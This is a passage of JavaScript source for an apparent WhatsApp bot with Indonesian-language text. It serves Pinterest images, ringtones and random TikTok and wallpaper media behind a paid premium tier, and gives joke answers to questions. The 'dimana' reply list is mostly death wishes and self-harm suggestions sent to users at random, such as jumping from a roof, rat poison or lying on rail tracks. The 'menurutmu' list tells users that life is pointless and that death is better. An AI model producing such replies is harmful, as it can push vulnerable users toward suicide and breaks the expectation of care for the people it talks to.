if (!text) return replygcxeon(`Enter Query`)
let { pinterest } = require('./lib/scraper')
anutrest = await pinterest(text)
result = anutrest[Math.floor(Math.random() * anutrest.length)]
XeonBotInc.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: m })
}
break
case 'ringtone': {
		if (!text) return replygcxeon(`Example : ${prefix + command} black rover`)
        let ringtone = require('./lib/scraper')
		let anutone2 = await ringtone(text)
		let result = anutone2[Math.floor(Math.random() * anutone2.length)]
		XeonBotInc.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
case 'tiktokgirl':
case 'tiktokghea':
case 'tiktokbocil':
case 'tiktoknukhty':
case 'tiktoksantuy':
case 'tiktokkayes':
case 'tiktokpanrika':
case 'tiktoknotnot':
case 'chinese':
case 'hijab':
case 'indo':
case 'japanese':
case 'korean':
case 'malay':
case 'randomgirl':
case 'randomboy':
case 'thai':
case 'vietnamese':
case 'aesthetic':
case 'antiwork':
case 'blackpink':
case 'bike':
case 'boneka':
case 'cosplay':
case 'cat':
case 'doggo':
case 'justina':
case 'kayes':
case 'kpop':
case 'notnot':
case 'car':
case 'profilepic':
case 'profilepicture':
case 'pubg':
case 'rose':
case 'ryujin':
case 'ulzzangboy':
case 'ulzzanggirl':
case 'wallml':
case 'wallpaperml':
case 'mobilelegend':
case 'wallpaperphone':
case 'wallphone': {
    if (!isPremium) return replygcxeon(`*MAAF, FITUR INI KHUSUS UNTUK MEMBER PREMIUM*

*SILAHKAN HUBUNGI ADMIN UNTUK MENDAFTAR SEBAGAI MEMBER PREMIUM*
*BIAYANYA 10 RIBU PER BULAN*`)

    await XeonStickWait()
    let data
    switch (command) {
    	case 'tiktokgirl': data = './src/media/tiktokvids/tiktokgirl.json'; break
        case 'tiktokghea': data = './src/media/tiktokvids/gheayubi.json'; break
        case 'tiktokbocil': data = './src/media/tiktokvids/bocil.json'; break
        case 'tiktoknukhty': data = './src/media/tiktokvids/ukhty.json'; break
        case 'tiktoksantuy': data = './src/media/tiktokvids/santuy.json'; break
        case 'tiktokkayes': data = './src/media/tiktokvids/kayes.json'; break
        case 'tiktokpanrika': data = './src/media/tiktokvids/panrika.json'; break
        case 'tiktoknotnot': data = './src/media/tiktokvids/notnot.json'; break
        case 'chinese': data = './src/media/tiktokpics/china.json'; break
        case 'hijab': data = './src/media/tiktokpics/hijab.json'; break
        case 'indo': data = './src/media/tiktokpics/indonesia.json'; break
        case 'japanese': data = './src/media/tiktokpics/japan.json'; break
        case 'korean': data = './src/media/tiktokpics/korea.json'; break
        case 'malay': data = './src/media/tiktokpics/malaysia.json'; break
        case 'randomgirl': data = './src/media/tiktokpics/random.json'; break
        case 'randomboy': data = './src/media/tiktokpics/random2.json'; break
        case 'thai': data = './src/media/tiktokpics/thailand.json'; break
        case 'vietnamese': data = './src/media/tiktokpics/vietnam.json'; break
        case 'aesthetic': data = './src/media/randompics/aesthetic.json'; break
        case 'antiwork': data = './src/media/randompics/antiwork.json'; break
        case 'blackpink': data = './src/media/randompics/blackpink.json'; break
        case 'bike': data = './src/media/randompics/bike.json'; break
        case 'boneka': data = './src/media/randompics/boneka.json'; break
        case 'cosplay': data = './src/media/randompics/cosplay.json'; break
        case 'cat': data = './src/media/randompics/cat.json'; break
        case 'doggo': data = './src/media/randompics/doggo.json'; break
        case 'justina': data = './src/media/randompics/justina.json'; break
        case 'kayes': data = './src/media/randompics/kayes.json'; break
        case 'kpop': data = './src/media/randompics/kpop.json'; break
        case 'notnot': data = './src/media/randompics/notnot.json'; break
        case 'car': data = './src/media/randompics/car.json'; break
        case 'profilepic':
        case 'profilepicture': data = './src/media/randompics/profile.json'; break
        case 'pubg': data = './src/media/randompics/pubg.json'; break
        case 'rose': data = './src/media/randompics/rose.json'; break
        case 'ryujin': data = './src/media/randompics/ryujin.json'; break
        case 'ulzzangboy': data = './src/media/randompics/ulzzangboy.json'; break
        case 'ulzzanggirl': data = './src/media/randompics/ulzzanggirl.json'; break
        case 'wallml':
        case 'wallpaperml':
        case 'mobilelegend': data = './src/media/randompics/wallml.json'; break
        case 'wallpaperphone':
        case 'wallphone': data = './src/media/randompics/wallhp.json'; break
    }

    let isi = JSON.parse(fs.readFileSync(data))
    let hasil = pickRandom(isi)
    let mediaType = data.includes('vids') ? 'video' : 'image'
    XeonBotInc.sendMessage(m.chat, { caption: mess.success, [mediaType]: { url: hasil.url } }, { quoted: m })
}
break
            case 'hd': {
    if (!isPremium) return replygcxeon(`*MAAF, FITUR INI KHUSUS UNTUK MEMBER PREMIUM*

*SILAHKAN HUBUNGI ADMIN UNTUK MENDAFTAR SEBAGAI MEMBER PREMIUM*
*BIAYANYA 10 RIBU PER BULAN*`)

    if (!quoted) return replygcxeon(`Where is the picture?`);
    if (!/image/.test(mime)) return replygcxeon(`Send/Reply Photos With Captions ${prefix + command}`);
    await XeonStickWait();
    const { remini } = require('./lib/hd');
    let media = await quoted.download();

    try {
        let proses = await remini(media, "enhance");
        XeonBotInc.sendMessage(m.chat, { image: proses, caption: mess.success }, { quoted: m });
    } catch (error) {
        console.error('Remini error:', error);
        replygcxeon('Sorry, failed to process image.');
    }
}
break;
			
		
                case 'bisakah': {
    if (!text) return replygcxeon(`Tanyain dong sesuatu\n\nContoh : ${prefix + command} aku joget?`)
    let bisa = [
        `Ya bisa lah brooo, jangan ngadi-ngadi lu.`,
        `Bisa sih, tapi siap-siap diketawain semut sekampung.`,
        `Mungkin bisa... asal kamu rela joget sambil makan ciki pedes.`,
        `Bisa banget! Modal gaya dikit, udah kayak artis TikTok.`,
        `Bisa sih, tapi resikonya malu 3 abad ke depan.`,
        `Ya bisa lah, masa gitu doang nyerah? Cupu amat.`,
        `Bisa, asal kamu mau teriak "AKU JOMBLO BAHAGIA" di tengah jalan.`,
        `Fix bisa! Tapi jangan kaget kalo tiba-tiba ada sapi nyamperin.`,
        `Bisa parah sih, asal jangan baper kalo diketawain tuyul.`,
        `Gaskeun lah bisa, siapa takut!`,
        `Bisaaaa, asal pas gagal jangan pura-pura pingsan ya.`,
        `Gampang banget! Modal pede sama muka tembok aja.`,
        `Bisa lah, apalagi kalau ditemenin kopi setengah ember.`,
        `Bisa sih, tapi harus tahan malu sampe lebaran kuda.`,
        `Bisa, asal siap mental diliatin abang bakso.`,
        `Bisa, dengan kekuatan sandal jepit bolong!`,
        `Woy bisa! Asal jangan sambil ngebucin ya.`,
        `Bisa parah, asal sambil ngunyah permen karet rasa kopi.`,
        `Bisa dong, modal mental badak aja.`,
        `Bisa! Tapi jangan lupa update story "MISI IMPOSIBEL" dulu.`,
        `Gas bisa! Tapi jangan kaget kalau tiba-tiba jadi seleb kampung.`,
        `Bisa sih, cuma kemungkinan abis itu jadi meme hidup.`,
        `Bisa, asal siap dikejar angsa ngamuk.`,
        `Yakin bisa! Tapi syaratnya: upload ke IG story.`,
        `Bisa banget, asal sambil goyang tik-tok gaya cacing kejang.`,
        `Bisa, cuma siapin mental kalau tiba-tiba di-roasting tetangga.`,
        `Bisa cuy! Tapi harus sambil bawa banner "Aku Legend".`,
        `Bisa aja, asal jangan sambil nyender di pintu angkot.`,
        `Bisaaa, asal siap diguyur air galon sama makhluk halus.`,
        `Bisa, tapi jaga-jaga aja bawa nasi uduk buat damaiin warga.`,
        `Bisa banget, asal jangan tiba-tiba kabur ke antartika.`,
        `Fix bisa sih, asal rela pake kostum pisang.`,
        `Bisaaaa, apalagi kalo lagi tanggal tua, mental baja aktif.`,
        `Bisa lah, masa kalah sama bocil kicik-kicik.`,
        `Bisa sih, asal kuat ketawa sampe perut keram.`,
        `Bisa bro, asal jangan lupa bawa jimat sandal bolong.`,
        `Bisa, asal baju udah siap kotor kayak abis perang paintball.`,
        `Bisa banget, kayak kamu bisa lupa mantan.`,
        `Bisa cuy, asal kuat menahan malu sampe keturunan ke-7.`,
        `Bisa lah, yang penting style swag dikit.`,
        `Bisa, modal semangat 45 sama muka badak.`,
        `Bisa, asal rela jadi tontonan warga satu RT.`,
        `Bisaaaa, cuma jangan lupa update status "Lagi edan".`,
        `Bisa brooo, bahkan jomblo legend pun percaya.`,
        `Bisa sih, asal kamu rela salto dari kasur ke lantai.`,
        `Bisa parah, kayak gacha hoki di game burik.`,
        `Bisa, asal jangan sambil nanya "Aku ganteng gak?".`,
        `Bisaaaa, tapi resiko ditimpuk sandal emak tinggi.`,
        `Bisa banget! Tapi jangan ngarep bonus hadiah nasi uduk.`,
        `Bisa cuy, apalagi kalo sambil teriak "AKU POWER RANGER".`,
    ]
    let keh = bisa[Math.floor(Math.random() * bisa.length)]
    let jawab = `*bisakah ${text}*\n*jawabannya* : ${keh}`
    await replygcxeon(jawab)
}
break
            case 'apa': {
    if (!text) return replygcxeon(`Tanyain dulu dong sesuatu\n\nContoh : ${prefix + command} dia masih jomblo?`)
    let apa = [
        `Bisa banget... kayak harapan pas UNBK, ilang tanpa jejak.`,
        `Waduh, itu mah kayak nyari kucing item malem-malem, susah bro.`,
        `Ya bisa lah, kalau lu kuat nahan malu satu kampung.`,
        `Bisa sih, tapi endingnya malah nangis di kamar mandi.`,
        `Bener banget! Bahkan nenek-nenek pun setuju.`,
        `Ya bisa, tapi kemungkinan kayak dapet warisan dari mantan... nihil.`,
        `Gampang, asal lu rela dijadiin meme seumur hidup.`,
        `Wah, itu sih kayak berharap dosen ngasih nilai gratis, halu bro.`,
        `Fix bisa, asal mental lu sekeras tembok tetangga.`,
        `Bisa, tapi siap-siap disawer sama tuyul pas tidur.`,
        `Yakin bisa! Tapi siap ngilang kayak THR karyawan.`,
        `Mungkin iya, mungkin juga lu cuma halu kebanyakan nonton drama.`,
        `Gas! Tapi endingnya bisa jadi masuk berita kocak daerah.`,
        `Bisa banget, asal pas gagal jangan nyalahin setan.`,
        `Ya bisa lah, modal nekat sama acting kayak orang kesurupan.`,
        `Tentu saja bisa, dengan syarat... nyebur ke kali sambil nyanyi dangdut.`,
        `Bisa parah, kayak utang yang makin numpuk tiap awal bulan.`,
        `Mungkin... kayak harapan bisa kurus tiap tahun baru.`,
        `Bisa cuy, asal lu kuat dimaki-maki netizen sotoy.`,
        `Ya bisa, kayak lu berharap WiFi lancar waktu mati lampu.`,
        `Kayaknya sih iya... kayak cinta sepihak, nyakitin cuy.`,
        `Yaelah bisa, asal rela digaslight sama hidup sendiri.`,
        `Bisa sih, tapi mungkin endingnya lu chattingan sama bot doang.`,
        `Bisa banget! Tapi jangan lupa nulis surat wasiat dulu.`,
        `Bisa bro! Tapi resikonya setinggi cita-cita pas masih kecil.`,
        `Tentu, tapi jangan nangis kalo gagal dan dibilang bocil kentang.`,
        `Bisa banget, kayak hubungan tanpa status... makin lama makin hampa.`,
        `Bisa sih, kayak kamu sok kuat pas habis ditinggalin pas sayang-sayangnya.`,
        `Woi bisa lah, asal siap juga ditinggal pas lagi butuh.`,
        `Mungkin aja, kayak harapan beli pulsa malah dapet kuota TikTok.`,
        `Yakin bisa! Tapi endingnya bisa jadi lu ngobrol sama galon kosong.`,
        `Bisa sih, cuma siapin mental kalo tiba-tiba ketemu karma.`,
        `Bisa banget, tapi efek sampingnya: ketawa getir sendirian.`,
        `Bisa, kayak ngarep mantan balikan, tau-tau undangan nyampe.`,
        `Gas lah! Tapi jangan baper kalau hasilnya cuma PHP doang.`,
        `Bisa sih, tapi resikonya gede, kayak beli cilok isinya angin.`,
        `Ya bisa, tapi jangan nyesel kalo endingnya ditinggal kayak laptop bekas.`,
        `Fix bisa! Tapi ya jangan kaget kalau semesta malah ngetroll lu.`,
        `Bisa, kayak lu berjuang buat dia yang udah bahagia sama orang lain.`,
        `Bisa banget! Tapi siap-siap disalamin malaikat ketawa.`,
        `Bisa cuy, asal hidup lu siap jadi sinetron 700 episode.`,
        `Ya bisa lah, asal lu ikhlas ketawain nasib sendiri.`,
        `Gaskeun, tapi endingnya bisa jadi lu malah disuruh ngepel dunia.`,
        `Bisaaa! Tapi modal mental strong kayak batu nisan.`,
        `Bisa banget, kayak dompet akhir bulan... kosong tapi penuh harapan.`,
        `Bisa sih, asal lu tahan batuk batuk batin tiap liat mantan bahagia.`,
        `Tentu aja bisa, kayak tidur jam 2 tapi mimpi dapet rejeki nomplok.`,
        `Bisa kok, asal sambil baca mantra "semangat walau kiamat".`,
        `Yakin bisa! Tapi endingnya lu ketawa sambil nangis di pojokan kamar.`,
        `Bisa brooo, kayak laptop kentang dipaksa main game triple-A.`,
    ]
    let kah = apa[Math.floor(Math.random() * apa.length)]
    let jawab = `*Apa ${text}?*\n*Jawabannya* : ${kah}`                
    await replygcxeon(jawab)
}
break
            case 'kapan': {
    if (!text) return replygcxeon(`Tanyain dulu napa\n\nContoh : ${prefix + command} aku nikah?`)
    let kapan = [
        `Besok... kalo semesta nggak males.`,
        `Pas lu udah bisa move on dari Indomie rasa Ayam Bawang.`,
        `5 tahun lagi... atau pas bumi udah disita alien.`,
        `Setelah lu nemuin unicorn beneran.`,
        `Ntar... kalo duit receh lu berubah jadi emas.`,
        `Saat lu bisa ketawa liat saldo ATM sendiri.`,
        `Kalo ayam bisa nge-rap, baru kejadian.`,
        `Tunggu aja, kayak nunggu dosen ngumpulin nilai.`,
        `Kapan-kapan... pas nasi goreng gratis dateng sendiri.`,
        `Pas kamu udah rela disuruh setan kerja lembur.`,
        `Mungkin... kalo meteor jatuh pas lu lagi tidur.`,
        `Besok... kalo mantan minta balikan (jangan mimpi).`,
        `Pas dinosaurus comeback buat reuni nasional.`,
        `Nanti, abis hujan duit receh dari langit.`,
        `Setelah lu bisa ngalahin tuyul di lomba sprint.`,
        `Saat dunia berhenti muter karena ngantuk.`,
        `Kalau lu bisa ngobrol sama kulkas dan dibales.`,
        `Tunggu dulu, sabar... kayak nunggu refund yang nggak jelas.`,
        `Pas zombie buka franchise McDonald's.`,
        `Kalau bumi reboot kayak HP error.`,
        `Mungkin besok... kalau malaikat sibuk ngurus giveaway.`,
        `Pas lu udah ikhlas liat orang lain bahagia.`,
        `Kapan ya... pas kuota lu nggak pernah abis sendiri.`,
        `Setelah lu sadar, hidup cuma main side quest doang.`,
        `Pas karma dateng pake ojek online.`,
        `Kalo duit receh lu berubah jadi saham Google.`,
        `Saat lu bisa main Mobile Legends tanpa bocil bacot.`,
        `Nunggu kiamat kecil-kecilan dulu.`,
        `Kalau kopi sachet berubah jadi emas batangan.`,
        `Setelah lu di-notice sama artis Korea... di mimpi.`,
        `Pas dunia bisa skip iklan YouTube tanpa premium.`,
        `Tunggu aja... kayak nunggu ayang ngechat duluan.`,
        `Nanti... abis lu ketemu jodoh di acara 7 harian.`,
        `Setelah lubang hitam undang arisan keluarga.`,
        `Pas ketek lu bersinar kayak lampu taman.`,
        `Kalau semut bikin demo minta upah layak.`,
        `Pas kamu sadar, hidup ini cuma prank dari malaikat.`,
        `Kalau bumi akhirnya dijual di Shopee flash sale.`,
        `Mungkin... pas malaikat iseng ganti jam dunia.`,
        `Nanti... abis malaikat pensiun massal.`,
        `Pas orang iseng bikin lomba lari pakai sandal jepit bolong.`,
        `Tunggu kucing kamu nyalon jadi presiden.`,
        `Saat kamu lebih sayang diri sendiri daripada overthinking.`,
        `Besok... kalau nasi padang gratis seumur hidup.`,
        `Kalau Tuhan ngasih update patch baru buat bumi.`,
        `Pas kamu rela dia nikah sama orang lain sambil senyum.`,
        `Saat utang negara lunas pake koin receh.`,
        `Kalau semua mantan kamu balikan minta maaf... (dalam mimpi basah).`,
        `Pas dunia ini jadi game sandbox open world beneran.`,
        `Kalau lu bisa nahan ngantuk liat dosen ngejelasin power point.`,
        `Mungkin nanti... pas kamu sadar hidup ini glitch belaka.`,
    ]
    
    let koh = kapan[Math.floor(Math.random() * kapan.length)]
    let jawab = `*Kapan ${text}?*\n*Jawabannya* : ${koh}`
    await replygcxeon(jawab)
}
break
case 'apakah': {
    if (!text) return replygcxeon(`*Nanya dulu goblok*\n\nContoh : ${prefix + command} *aku bahagia*?`)
    let lel = [
        `Apakah? Tanya cermin, cermin lebih jujur dari temenmu.`,
        `Mungkin... kalau hidup lu bukan tutorial suffering.`,
        `Sepertinya iya... kalo besok lu masih kuat bangun.`,
        `Bisa jadi... kalo lu lahir lagi.`,
        `Kalau Tuhan iseng mau bercanda, mungkin iya.`,
        `Kalau hoki lu nggak disita waktu lahir, bisa aja.`,
        `Tergantung... mau percaya takdir atau prank kehidupan?`,
        `Bisa iya, bisa nggak... kayak harapan pas tahun baru.`,
        `Tanya dulu sama semesta, dia juga ketawa tuh.`,
        `Bisa, kalau lu menang lotre di dunia paralel.`,
        `Coba tanya mantan, dia paling jujur kalo soal nyakitin.`,
        `Kalau nyokap lu doa tiap malam, mungkin.`,
        `Mungkin... setelah kiamat kecil di hati kamu.`,
        `Sepertinya tidak, hidup kamu udah kayak sinetron azab.`,
        `Tergantung, lu mau sabar atau menyerah hari ini?`,
        `Coba liat saldo rekening, itu jawabannya.`,
        `Kalau mau, bisa... asalkan lu jual ginjal.`,
        `Sejujurnya... nggak usah terlalu berharap.`,
        `Tanya diri sendiri, masih kuat pura-pura bahagia?`,
        `Mungkin iya, setelah kamu sadar hidup ini prank.`,
        `Kalau karma nggak ngantuk, mungkin segera.`,
        `Sepertinya... lebih cepat kucing kamu kawin dulu.`,
        `Kalau bumi nggak keburu kebakaran, mungkin bisa.`,
        `Tergantung... lu kuat dibohongin dunia?`,
        `Kalau hidup lu kayak anime, mungkin iya.`,
        `Bisa... kalau lu nggak gampang baper.`,
        `Tunggu aja, kayak nunggu refund COD.`,
        `Kalau Tuhan lagi baik mood-nya, mungkin dikabulin.`,
        `Mungkin... pas lu udah pasrah total.`,
        `Setelah lu sadar semua orang fake, baru mulai.`,
        `Kalau langit jatuh, mungkin sekalian terjadi.`,
        `Kalau malaikat nganggur, mungkin didengerin.`,
        `Kalau dunia ini game, lu player yang bug.`,
        `Kalau hati lu kuat, mungkin bertahan sehari lagi.`,
        `Sepertinya lebih mungkin lu jadi meme dulu.`,
        `Pas kamu berhenti overthinking, baru ada jawabannya.`,
        `Kalau lu udah rela disakiti dunia, baru mulai bahagia.`,
        `Sepertinya... lebih gampang dinosaurus hidup lagi.`,
        `Kalau otak kamu nggak rusak kena ekspektasi.`,
        `Bisa jadi, kalo mau nangis di pojokan dulu.`,
        `Mungkin setelah kamu lupa semua kesalahan.`,
        `Kalau kamu bisa ketawa liat kegagalan, baru bisa.`,
        `Tunggu aja... kayak nunggu sinyal di basement.`,
        `Kalau mental kamu udah sekeras Nokia 3310.`,
        `Kalau harapan kamu nggak gampang patah.`,
        `Mungkin... pas kamu sadar kamu cuma NPC.`,
        `Kalau hidupmu udah kayak side quest gagal.`,
        `Kalau nasib kamu nggak dikutuk nenek moyang.`,
        `Sepertinya kamu butuh terapi sebelum jawabannya muncul.`,
        `Kalau malaikat bosen dengerin keluhanmu.`,
        `Kalau Tuhan mau nge-prank lebih parah.`,
        `Kalau otak kamu reboot otomatis.`,
        `Kalau kamu bisa relain semua kehilangan.`,
        `Kalau dosa kamu udah di-discount.`,
        `Kalau hidup ini ternyata simulasi error.`,
        `Mungkin... kalau kamu berhenti sok kuat.`,
        `Kalau kamu rela ketawa sambil nangis.`,
        `Kalau hidup lu bukan sinetron penuh plot twist.`,
        `Kalau kamu sadar orang tua kamu pahlawan asli.`,
        `Kalau keajaiban masih punya kuota buat kamu.`,
        `Kalau semesta ngasih diskon promo kebahagiaan.`,
        `Kalau lu rela jadi villain di cerita orang lain.`,
        `Kalau lu sadar, berharap itu hobi menyakitkan.`,
        `Kalau lu udah siap ditinggal pas lagi sayang-sayangnya.`,
        `Kalau lu kuat ngeliat orang lain sukses tanpa iri.`,
        `Kalau lu berhenti nge-ghosting orang baik.`,
        `Kalau hati lu udah lelah tapi nggak nyerah.`,
        `Kalau lu sadar sukses itu bukan buat semua orang.`,
        `Kalau semesta salah kirim keberuntungan ke lu.`,
        `Kalau hidupmu upgrade dari low budget drama.`,
        `Kalau lu udah siap kehilangan lebih banyak.`,
        `Kalau cinta kamu kuat ngalahin cicilan utang.`,
        `Kalau lu rela dighosting berkali-kali.`,
        `Kalau otak lu tahan mental breakdown harian.`,
        `Kalau kamu sadar semua ini temporary aja.`,
        `Kalau kamu udah kebal diboongin orang yang kamu sayang.`,
        `Kalau kamu mau ngakak pas gagal, bukan nangis.`,
        `Kalau kamu sadar, happy ending itu mahal.`,
        `Kalau hidup kamu dapet patch update bahagia.`,
        `Kalau kamu rela dilukai berkali-kali demi move on.`,
        `Kalau kamu tahan ketawa pas dikhianatin.`,
        `Kalau semesta buka cabang keberuntungan baru.`,
        `Kalau hati kamu upgrade jadi titanium.`,
        `Kalau kamu lebih cinta diri sendiri daripada drama.`,
        `Kalau kamu ikhlas walau dunia terus nge-prank.`,
        `Kalau kamu kuat sendirian di ruang gelap.`,
        `Kalau kamu udah berhenti pura-pura kuat.`,
        `Kalau kamu sadar, self love bukan kata motivasi doang.`,
        `Kalau lu ngerti kadang hidup emang nggak adil.`,
        `Kalau semua luka lu cuma jadi bahan ketawa.`,
        `Kalau lu bisa bilang "yaudah" tanpa getar suara.`,
        `Kalau lu sadar menangis bukan kelemahan.`,
        `Kalau semua harapan lu mati dan lu tetap hidup.`,
        `Kalau lu bisa ketawa saat segalanya ancur.`,
        `Kalau kamu sadar musuh terbesar adalah ekspektasi sendiri.`,
        `Kalau kamu udah capek ngemis perhatian.`,
        `Kalau kamu udah rela jadi badut tanpa penonton.`,
        `Kalau dunia ini kasih lu plot armor dadakan.`,
        `Kalau kamu berhenti berharap dari orang yang nggak peduli.`,
        `Kalau hidup lu upgrade dari easy mode ke hardcore mode.`,
    ]
    
    let kah = lel[Math.floor(Math.random() * lel.length)]
    let jawab = `*Apakah ${text}?*\n*Jawabannya*: ${kah}`
    await replygcxeon(jawab)
}
break
case 'dimana': {
    if (!text) return replygcxeon(`*nanya dulu lah*\n\ncontohnya : ${prefix + command} bapak lu?`)
    let whereAnswers = [
        `Di bawah tanah, tepat di sebelah jenazah kakek lu.`,
        `Di lemari, bersama sisa-sisa harapan hidup lu.`,
        `Di dasar laut, dikasih pemberat sama musuh lu.`,
        `Di jalan tol, nunggu lu ketabrak truk.`,
        `Di kamar gelap, bareng ketakutan lu yang nggak bisa lu lawan.`,
        `Di tempat sampah, bareng harga diri lu.`,
        `Di neraka, udah dipesenin tempat dari lahir.`,
        `Di belakang pintu, nunggu lu buka terus dicekik.`,
        `Di freezer, bareng mayat yang lu kira tidur.`,
        `Di loteng, tempat setan nonton lu setiap malam.`,
        `Di rumah sakit jiwa, tempat lu seharusnya dirawat.`,
        `Di bawah kasur, tempat mimpi buruk lu berkembang biak.`,
        `Di dalam kulkas kosong, bareng mimpi masa depan lu.`,
        `Di pemakaman, nunggu lu dateng dan gabung.`,
        `Di atap rumah, nunggu lu lompat dengan gaya bebas.`,
        `Di dapur, racun tikus udah siap buat lu.`,
        `Di rel kereta, nunggu lu rebahan permanen.`,
        `Di dalam botol, bareng semua kesalahan hidup lu.`,
        `Di tong sampah belakang pasar, tempat hidup lu berakhir.`,
        `Di toilet umum, tempat harga diri lu dibuang.`,
        `Di jembatan, nunggu angin dorong lu ke bawah.`,
        `Di lubang got, tempat lu bakal pulang.`,
        `Di tempat tidur rumah sakit, napas terakhir lu disiapin.`,
        `Di kursi listrik, tinggal tunggu giliran nyala.`,
        `Di kamar mandi, bareng semua air mata buangan lu.`,
        `Di jalan buntu, kayak hidup lu sekarang.`,
        `Di ruang isolasi, biar lu ngomong sama dinding.`,
        `Di lorong rumah sakit kosong, bareng arwah penasaran.`,
        `Di oven besar, siap dibakar bareng dosa lu.`,
        `Di pojokan kamar, ngobrol sama suara-suara di kepala lu.`,
        `Di keranjang sampah rumah sakit, sisa dari eksperimen gagal.`,
        `Di rumah kosong, nunggu lu datang buat korban berikutnya.`,
        `Di sumur tua, tempat bisikan manggil lu.`,
        `Di sarang laba-laba, tempat mayat kecil lu digantung.`,
        `Di hutan terlarang, lu bakal jadi fosil baru.`,
        `Di belakang cermin, tempat lu ngeliat sisi tergelap diri lu.`,
        `Di bawah jembatan, kayak hidup lu: beban buat semua orang.`,
        `Di dinding penuh bercak darah, tempat kenangan terakhir.`,
        `Di kasur busuk, tidur abadi tanpa alarm.`,
        `Di rumah jagal, kayak sapi-sapi yang udah pasrah.`,
        `Di ruang bawah tanah, bareng suara minta tolong.`,
        `Di kamar hotel kosong, tempat dosa lu dikasih skor.`,
        `Di rel listrik, hidup lu diakhiri dengan percikan api.`,
        `Di jalan gelap tanpa lampu, kayak masa depan lu.`,
        `Di dalam kantong mayat, nama lu udah diprint.`,
        `Di ruangan sempit penuh jeritan, tempat terakhir lu.`,
        `Di balik pohon besar, nunggu lu lengah.`,
        `Di dasar sumur, mayat-mayat pada say hi.`,
        `Di atas genteng, malaikat maut lagi nungguin lu.`,
        `Di ladang jagung, suara-suara manggil nama lu.`,
        `Di bawah tanah liat basah, nyiapin rumah baru buat lu.`,
        `Di rawa busuk, disambut sama bau bangkai.`,
        `Di kuburan massal, bertetangga sama arwah tak dikenal.`,
        `Di dalam kardus, siap dikirim ke dunia lain.`,
        `Di kontainer tua, satu-satunya perjalanan terakhir lu.`,
        `Di lubang lift jatuh, tempat akhir drama hidup lu.`,
        `Di kapal karam, tidur bareng ratusan tulang belulang.`,
        `Di taman hiburan kosong, tawa palsu bergema ngeri.`,
        `Di pabrik tua, sisa darah udah mengering di lantai.`,
        `Di rumah jagal ayam, daging lu siap dipaketin.`,
        `Di tambang runtuh, terkubur hidup-hidup tanpa saksi.`,
        `Di ruang pembakaran, abu lu bersatu dengan debu sejarah.`,
        `Di tebing curam, menunggu langkah kecil salah arah.`,
        `Di jalur pelarian gagal, hidup lu langsung didelete.`,
        `Di antara anjing liar kelaparan, tulang lu jadi camilan.`,
        `Di festival kematian, tiket VIP buat lu.`,
        `Di jalanan sepi, ditelan gelap sebelum sempat menjerit.`,
        `Di balkon tinggi, angin terakhir bersaksi.`,
        `Di tempat pengasingan, nama lu dilupakan semua orang.`,
        `Di dasar jurang, suara terakhir lu cuma "AAA!!!".`,
        `Di tong racun, meleleh bareng ego lu.`,
        `Di tengah badai, diterkam petir tanpa peringatan.`,
        `Di dalam brankas bank terbengkalai, kayak mimpi lu yang terkunci.`,
        `Di dalam boneka rusak, tempat jiwa lu terjebak.`,
        `Di pabrik tua ambruk, tertindih dosa sendiri.`,
        `Di jalan tol tanpa penerangan, ditabrak tanpa sempat lihat plat nomor.`,
        `Di lorong sempit tanpa oksigen, napas terakhir gratis.`,
        `Di bawah dermaga, tubuh lu main ayunan bareng ombak.`,
        `Di belakang tempat sampah restoran, dibagiin gratis ke belatung.`,
        `Di ruangan terkunci berdebu, suara-suara udah nggak sabar.`,
        `Di gubuk reyot tengah hutan, diterkam bisikan gila.`,
        `Di dalam cor beton, jadi pondasi yang nggak pernah dilihat.`,
        `Di oven krematorium, jadi asap kenangan busuk.`,
        `Di gua tertutup, ditemani gemuruh suara kematian.`,
        `Di pabrik semen, dikubur bareng adukan beton.`,
        `Di kamar hotel murahan, mayat lu nggak dibayar refund.`,
        `Di sungai hitam, dibuai bau amis kematian.`,
        `Di lorong apartemen kosong, langkah terakhir sebelum menghilang.`,
        `Di dalam peti tanpa nama, dikubur tanpa tangis.`,
        `Di tengah badai salju, membeku kayak perasaan mantan.`,
        `Di kantor kosong malam hari, bayangan mengintai lu.`,
        `Di semak-semak liar, tubuh lu jadi pupuk alami.`,
        `Di hutan hujan terpencil, tubuh lu dibagi semut merah.`,
        `Di tangga gedung tua, satu langkah slip = tamat.`,
        `Di ruangan basah berjamur, napas lu digigit perlahan.`,
        `Di sudut ruangan sunyi, pelan-pelan lu dilupakan.`
    ]

    let kah = whereAnswers[Math.floor(Math.random() * whereAnswers.length)]
    let jawab = `*Dimana ${text}?*\nJawabannya: ${kah}`
    await replygcxeon(jawab)
}
break

case 'menurutmu': {
    if (!text) return replygcxeon(`Tanyakan sesuatu dulu!\n\nContoh: ${prefix + command} hidup itu berharga?`)

    const responses = [
        `Menurutku? Hidup itu cuma masalah waktu, dan waktu itu nggak selalu baik.`,
        `Hidup itu seperti mimpi buruk yang nggak pernah berakhir.`,
        `Menurutku, lebih baik tidur selamanya, daripada hidup terus menderita.`,
        `Hidup itu sebuah ilusi, kita cuma menunggu waktu untuk akhirnya pergi.`,
        `Menurutku, kita semua cuma menunggu giliran untuk tenggelam.`,
        `Hidup itu cuma perantara, saatnya nanti kita pergi, semuanya jadi sia-sia.`,
        `Menurutku, nggak ada yang benar-benar bahagia di dunia ini.`,
        `Hidup itu cuma jalan panjang menuju kegelapan, kita hanya bisa berlari secepat mungkin.`,
        `Menurutku, kadang lebih baik nggak dilahirkan sama sekali daripada harus menderita seperti ini.`,
        `Hidup ini penuh rasa sakit, dan kita cuma bisa menunggu kapan semuanya berakhir.`,
        `Menurutku, kita cuma aktor dalam drama kehidupan, tapi ujungnya tetap mati.`,
        `Kadang, hidup itu rasanya seperti penjara yang nggak ada pintunya. Coba deh pikirin.`,
        `Menurutku, lebih baik mati dengan damai daripada hidup penuh pertanyaan.`,
        `Hidup itu nggak adil, yang kuat bertahan, yang lemah? Ya, hanya menunggu waktunya.`,
        `Menurutku, kadang kita cuma berjuang untuk sesuatu yang nggak pernah ada.`,
        `Hidup itu penuh kesedihan yang nggak bisa dihindari, kita cuma mencoba menghadapinya.`,
        `Menurutku, semua yang kita perjuangkan itu nggak ada gunanya pada akhirnya.`,
        `Hidup itu cuma perjuangan tanpa akhir, dan setiap orang pasti merasakannya.`,
        `Menurutku, hidup yang terlalu lama itu bikin kita merasa kosong.`,
        `Kadang lebih baik tidur sepanjang hidup daripada terbangun dan merasakan penderitaan.`,
